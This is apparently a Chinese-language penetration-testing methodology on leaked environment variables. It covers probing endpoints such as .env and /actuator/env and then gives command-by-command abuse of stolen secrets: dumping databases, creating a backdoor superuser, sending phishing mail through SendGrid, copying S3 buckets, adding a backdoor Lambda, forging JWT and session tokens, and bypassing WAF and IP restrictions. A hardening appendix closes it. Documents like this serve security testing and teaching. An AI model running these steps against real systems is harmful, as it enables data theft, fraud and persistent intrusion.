# 环境变量信息泄露利用方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的环境变量信息泄露检测和利用流程。环境变量常被用于存储应用程序的配置信息和敏感凭证，当这些信息被意外泄露时，攻击者可以利用它们获取系统权限、数据库访问权或其他敏感资源。

## 1.2 适用范围

- Web 应用程序（PHP、Python、Node.js、Java 等）
- 容器化环境（Docker、Kubernetes）
- 云平台部署（AWS、Azure、GCP）
- CI/CD 管道配置
- 服务器less 架构

## 1.3 读者对象

- 渗透测试工程师
- 安全分析师
- 云安全审计人员
- DevSecOps 工程师

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

环境变量信息泄露是指应用程序由于配置错误或代码缺陷，导致存储在环境变量中的敏感信息被暴露给未授权用户。

**本质问题**：
- 应用程序将环境变量内容输出到响应中
- 错误页面显示环境变量信息
- 调试接口暴露环境变量
- 日志文件包含环境变量
- 源代码硬编码或引用环境变量

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-526 | Exposure of Sensitive Information Through Environmental Variables（通过环境变量暴露敏感信息） |
| CWE-200 | Information Exposure（信息泄露） |
| CWE-312 | Cleartext Storage of Sensitive Information（敏感信息明文存储） |

### 常见敏感环境变量

| 变量类型 | 常见变量名 | 危害等级 |
|---------|-----------|---------|
| **数据库凭证** | DATABASE_URL, DB_PASSWORD, MYSQL_ROOT_PASSWORD | 严重 |
| **API 密钥** | API_KEY, API_SECRET, AWS_SECRET_ACCESS_KEY | 严重 |
| **认证令牌** | JWT_SECRET, SESSION_SECRET, AUTH_TOKEN | 严重 |
| **云服务凭证** | AWS_ACCESS_KEY_ID, AZURE_CLIENT_SECRET | 严重 |
| **第三方服务** | SENDGRID_API_KEY, STRIPE_SECRET_KEY | 高 |
| **加密密钥** | ENCRYPTION_KEY, PRIVATE_KEY, SIGNING_KEY | 严重 |
| **管理员凭证** | ADMIN_PASSWORD, ROOT_PASSWORD | 严重 |
| **应用配置** | APP_SECRET, APP_KEY, SECRET_KEY_BASE | 高 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 风险点描述 | 潜在危害 |
|---------|-----------|---------|
| **错误页面** | 异常处理显示环境变量 | 获取数据库凭证、API 密钥 |
| **调试端点** | /env、/config 等端点开放 | 获取全部配置信息 |
| **PHP 信息页面** | phpinfo() 页面暴露 | 获取所有 PHP 配置和环境变量 |
| **日志文件** | 日志记录环境变量 | 日志泄露导致凭证暴露 |
| **源代码泄露** | Git 仓库包含.env 文件 | 获取历史提交的环境变量 |
| **容器配置** | Docker 环境变量明文 | 容器内所有环境变量可见 |
| **K8s ConfigMap** | ConfigMap 未加密 | 集群配置泄露 |
| **CI/CD 配置** | GitHub Actions 日志泄露 | 部署凭证暴露 |

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

**1. 错误页面探测**

```bash
# 触发异常访问
curl https://target.com/nonexistent-page
curl https://target.com/api/v1/invalid
curl -X POST https://target.com/api -d "invalid=json"

# 检查响应是否包含环境变量
# 查找关键词：
# - PATH=
# - HOME=
# - DATABASE_
# - API_KEY
# - SECRET
# - AWS_
```

**2. 调试端点扫描**

```bash
# 常见环境变量泄露端点
curl https://target.com/env
curl https://target.com/environment
curl https://target.com/config
curl https://target.com/configuration
curl https://target.com/debug
curl https://target.com/actuator/env          # Spring Boot
curl https://target.com/actuator/configprops  # Spring Boot
curl https://target.com/server-info           # Apache
curl https://target.com/phpinfo.php           # PHP 信息
curl https://target.com/info.php
curl https://target.com/test.php
```

**3. 特定框架探测**

```bash
# Django
curl https://target.com/admin/jsi18n/  # 可能泄露配置

# Flask
curl https://target.com/console        # Werkzeug 控制台

# Ruby on Rails
curl https://target.com/rails/info/properties

# Laravel
curl https://target.com/.env           # 直接访问.env 文件
curl https://target.com/storage/logs/laravel.log
```

**4. 文件泄露探测**

```bash
# .env 文件探测
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production
curl https://target.com/.env.backup
curl https://target.com/.env.old

# 配置文件探测
curl https://target.com/config.php.bak
curl https://target.com/config.yml
curl https://target.com/application.yml
curl https://target.com/settings.py

# 日志文件探测
curl https://target.com/logs/error.log
curl https://target.com/debug.log
curl https://target.com/app.log
```

### 2.3.2 白盒测试

**1. 代码审计要点**

```python
# ❌ 不安全：直接输出环境变量
import os
@app.route('/debug')
def debug():
    return str(os.environ)  # 泄露所有环境变量

# ❌ 不安全：输出特定环境变量
@app.route('/config')
def config():
    return {
        'database': os.environ.get('DATABASE_URL'),
        'secret': os.environ.get('SECRET_KEY')
    }

# ✅ 安全：不输出敏感配置
@app.route('/health')
def health():
    return {'status': 'ok'}
```

```java
// ❌ 不安全：Spring Boot Actuator 暴露所有端点
management.endpoints.web.exposure.include=*

// ✅ 安全：仅暴露必要端点
management.endpoints.web.exposure.include=health,info
```

```php
// ❌ 不安全：phpinfo 页面
<?php phpinfo(); ?>

// ❌ 不安全：输出环境变量
<?php
    echo getenv('DATABASE_URL');
    print_r($_ENV);
?>
```

**2. 配置文件检查**

```yaml
# Docker Compose - ❌ 不安全
version: '3'
services:
  app:
    environment:
      - DATABASE_URL=postgres://user:password@db/prod
      - API_KEY=sk-1234567890abcdef

# Docker Compose - ✅ 安全
version: '3'
services:
  app:
    env_file:
      - .env  # 使用.env 文件，不提交到版本控制
```

```yaml
# Kubernetes - ❌ 不安全
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
  - name: app
    env:
    - name: DATABASE_PASSWORD
      value: "supersecret"  # 明文密码

# Kubernetes - ✅ 安全
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
  - name: app
    envFrom:
    - secretRef:
        name: app-secrets  # 使用 Secret
```

### 2.3.3 自动化检测工具

```bash
# 使用 Nuclei 扫描
nuclei -t exposures/env-file.yaml -u https://target.com
nuclei -t exposures/config-files.yaml -u https://target.com

# 使用 dirsearch 扫描敏感文件
dirsearch -u https://target.com -e env,log,config,yml,yaml

# 使用 Git 泄露检测
trufflehog https://github.com/target/repo
gitleaks --repo=https://github.com/target/repo

# 使用自定义脚本
python3 env_leak_scanner.py -t https://target.com
```

## 2.4 漏洞利用方法

### 2.4.1 数据库凭证泄露利用

**场景**：从环境变量泄露获取 DATABASE_URL

```bash
# 获取的环境变量
DATABASE_URL=postgres://admin:SuperSecret123@db.target.com:5432/production

# 1. 直接连接数据库
psql "postgres://admin:SuperSecret123@db.target.com:5432/production"

# 2. 读取敏感数据
SELECT * FROM users;
SELECT * FROM admin_credentials;
SELECT * FROM payment_info;

# 3. 修改数据
UPDATE users SET role='admin' WHERE username='attacker';

# 4. 创建后门账户
CREATE USER attacker WITH PASSWORD 'backdoor' SUPERUSER;
```

**MySQL 示例**：

```bash
# 获取的环境变量
MYSQL_ROOT_PASSWORD=RootPass123
DATABASE_URL=mysql://root:RootPass123@mysql.target.com:3306/app

# 连接 MySQL
mysql -h mysql.target.com -u root -pRootPass123

# 获取所有数据库
SHOW DATABASES;

# 读取用户表
USE app;
SELECT * FROM users;
```

### 2.4.2 API 密钥泄露利用

**场景**：获取第三方服务 API 密钥

```bash
# 获取的环境变量
SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxx
STRIPE_SECRET_KEY=sk_live_xxxxxxxxxxxxxxxxxxxx
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# 1. SendGrid - 发送邮件钓鱼
curl -X POST "https://api.sendgrid.com/v3/mail/send" \
  -H "Authorization: Bearer SG.xxxxxxxxxxxxxxxxxxxx" \
  -d '{"personalizations":[{"to":[{"email":"victim@example.com"}]}],"from":{"email":"admin@target.com"},"subject":"Urgent","content":[{"type":"text/plain","value":"Click here..."}]}'

# 2. Stripe - 窃取支付信息
curl https://api.stripe.com/v1/charges \
  -u sk_live_xxxxxxxxxxxxxxxxxxxx: \
  -d limit=100

# 3. AWS - 访问云资源
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
aws s3 ls
aws ec2 describe-instances
```

### 2.4.3 JWT 密钥泄露利用

**场景**：获取 JWT 签名密钥

```bash
# 获取的环境变量
JWT_SECRET=super_secret_jwt_key_12345

# 1. 伪造 JWT Token
import jwt
import datetime

secret = "super_secret_jwt_key_12345"

# 伪造管理员 Token
payload = {
    'user_id': 1,
    'username': 'admin',
    'role': 'administrator',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
}

fake_token = jwt.encode(payload, secret, algorithm='HS256')
print(fake_token)

# 2. 使用伪造的 Token 访问
curl -H "Authorization: Bearer <fake_token>" https://target.com/admin
```

### 2.4.4 云服务凭证泄露利用

**场景**：获取 AWS/Azure/GCP 凭证

**AWS 凭证利用**：

```bash
# 获取的环境变量
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1

# 1. 配置 AWS CLI
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
aws configure set default.region us-east-1

# 2. 枚举 S3 存储桶
aws s3 ls

# 3. 访问敏感存储桶
aws s3 cp s3://target-backups/ ./downloaded/ --recursive

# 4. 查看 EC2 实例
aws ec2 describe-instances

# 5. 获取 IAM 用户信息
aws iam get-user
aws iam list-users

# 6. 持久化 - 创建访问密钥
aws iam create-access-key --user-name target-user

# 7. 创建后门 Lambda 函数
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.8 \
  --handler index.handler \
  --role arn:aws:iam::123456789012:role/lambda-role \
  --zip-file fileb://backdoor.zip
```

**GCP 凭证利用**：

```bash
# 获取 GOOGLE_APPLICATION_CREDENTIALS 内容
# Service Account JSON Key

# 1. 保存密钥文件
echo "$GOOGLE_CREDENTIALS" > service-account.json

# 2. 认证
gcloud auth activate-service-account --key-file=service-account.json

# 3. 枚举资源
gcloud compute instances list
gcloud storage buckets list

# 4. 访问存储桶
gsutil cp gs://target-bucket/secret-data.json .
```

### 2.4.5 应用密钥泄露利用

**场景**：获取应用层密钥

```bash
# 获取的环境变量
SECRET_KEY_BASE=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ENCRYPTION_KEY=aes256-encryption-key-here
SESSION_SECRET=session-secret-key

# 1. Django SECRET_KEY 利用
# 可以生成有效的 CSRF Token
# 可以签名任意 Session

from django.core import signing
signing.dumps({"user_id": 1, "is_admin": True}, key="SECRET_KEY")

# 2. Flask Session 伪造
from itsdangerous import Signer
s = Signer("SECRET_KEY")
fake_session = s.sign('{"user_id":1,"role":"admin"}')

# 3. Laravel APP_KEY 利用
# 可以解密 Cookie
# 可以伪造反序列化 Payload
```

### 2.4.6 容器环境变量提取

**场景**：在容器内提取环境变量

```bash
# 1. 如果已获取容器 Shell
# 查看所有环境变量
env
printenv
cat /proc/1/environ | tr '\0' '\n'

# 2. 从 Docker 检查命令
docker inspect <container_id> | grep -A 20 "Env"

# 3. 从 Kubernetes Pod
kubectl exec <pod_name> -- env
kubectl get pod <pod_name> -o jsonpath='{.spec.containers[*].env}'

# 4. 提取特定变量
echo $DATABASE_URL
echo $API_KEY
cat /proc/1/environ | grep SECRET
```

## 2.5 漏洞利用绕过方法

### 2.5.1 WAF 绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **路径遍历** | 使用../访问.env | `/.env`, `/../.env` |
| **URL 编码** | 编码特殊字符 | `/%2e%65%6e%76` |
| **大小写混合** | 利用大小写不敏感 | `/.ENV`, `/.Env` |
| **添加后缀** | 绕过精确匹配 | `/.env.bak`, `/.env~` |
| **HTTP 头注入** | 通过头注入 | `X-Forwarded-Host: .env` |

### 2.5.2 访问控制绕过

```bash
# 如果/env 端点有 IP 限制
# 尝试 X-Forwarded-For 绕过
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/env

# 尝试内部域名访问
curl -H "Host: localhost" https://target.com/env
curl -H "Host: 127.0.0.1" https://target.com/env

# 使用 SSRF 访问内网端点
curl "https://target.com/ssrf?url=http://127.0.0.1:8080/env"
```

### 2.5.3 日志注入提取

```bash
# 如果无法直接访问环境变量
# 但可以通过日志查看

# 1. 触发错误，让应用记录环境变量到日志
curl https://target.com/trigger-error

# 2. 访问日志文件
curl https://target.com/logs/error.log

# 3. 查找环境变量
grep "DATABASE" error.log
grep "SECRET" error.log
```

---

# 第三部分：附录

## 3.1 环境变量安全检查清单

```
□ 环境变量是否存储在安全的密钥管理系统
□ .env 文件是否添加到.gitignore
□ 生产环境是否使用独立的密钥管理系统
□ 错误页面是否过滤环境变量信息
□ 调试端点是否关闭或限制访问
□ 日志是否记录敏感环境变量
□ 容器是否使用 Secret 管理敏感信息
□ CI/CD 管道是否安全存储凭证
□ 是否定期轮换环境变量密钥
□ 是否有环境变量访问审计日志
```

## 3.2 安全配置示例

**Docker - 使用 Secret**：

```yaml
# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp:latest
    secrets:
      - db_password
      - api_key

secrets:
  db_password:
    external: true
  api_key:
    external: true
```

**Kubernetes - 使用 Secret**：

```yaml
# 创建 Secret
kubectl create secret generic app-secrets \
  --from-literal=database-password='secret123' \
  --from-literal=api-key='apikey123'

# Pod 中使用
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
  - name: app
    image: myapp:latest
    env:
    - name: DATABASE_PASSWORD
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: database-password
```

**GitHub Actions - 使用 Secrets**：

```yaml
# .github/workflows/deploy.yml
name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Deploy
      env:
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      run: |
        aws deploy ...
```

**应用代码 - 安全处理**：

```python
# ✅ 安全：不输出环境变量
import os
from flask import Flask

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')

@app.route('/health')
def health():
    return {'status': 'ok'}  # 不泄露任何配置

# ❌ 不安全
@app.route('/debug')
def debug():
    return {
        'secret': os.environ.get('SECRET_KEY'),  # 泄露密钥
        'database': os.environ.get('DATABASE_URL')
    }
```

## 3.3 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **TruffleHog** | Git 历史密钥扫描 | `trufflehog https://github.com/repo` |
| **Gitleaks** | Git 密钥扫描 | `gitleaks --repo=https://github.com/repo` |
| **GitLeaks** | 本地 Git 扫描 | `gitleaks detect --source=. ` |
| **Nuclei** | Web 漏洞扫描 | `nuclei -t exposures/` |
| **dirsearch** | 目录文件扫描 | `dirsearch -u target -e env,log` |
| **AWS Prowler** | AWS 配置审计 | `prowler -M json` |
| **ScoutSuite** | 云安全审计 | `scoutuite aws` |
| **dotenv-linter** | .env 文件检查 | `dotenv-linter check` |

## 3.4 密钥管理系统

| 系统 | 适用场景 | 特点 |
|-----|---------|------|
| **AWS Secrets Manager** | AWS 环境 | 自动轮换、集成 AWS 服务 |
| **AWS Parameter Store** | AWS 环境 | 免费层级、简单使用 |
| **Azure Key Vault** | Azure 环境 | HSM 支持、完整密钥管理 |
| **GCP Secret Manager** | GCP 环境 | 版本控制、细粒度访问 |
| **HashiCorp Vault** | 多云/本地 | 开源、功能强大 |
| **Kubernetes Secrets** | K8s 环境 | 原生集成、需加密 |

## 3.5 修复建议

1. **使用密钥管理系统** - 不要将敏感信息存储在环境变量中
2. **实施最小权限** - 限制环境变量的访问范围
3. **加密存储** - 对敏感环境变量进行加密
4. **定期轮换** - 定期更换所有密钥和凭证
5. **访问审计** - 记录所有环境变量的访问
6. **代码审查** - 确保代码不输出环境变量
7. **关闭调试端点** - 生产环境关闭所有调试功能
8. **配置错误页面** - 自定义错误页面，不显示敏感信息
9. **使用.gitignore** - 确保.env 文件不提交到版本控制
10. **实施网络隔离** - 限制调试端点的网络访问

---

**参考资源**：
- [CWE-526](https://cwe.mitre.org/data/definitions/526.html)
- [OWASP Secrets Management](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
- [12 Factor App - Config](https://12factor.net/config)
- [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)
- [HashiCorp Vault](https://www.vaultproject.io/)
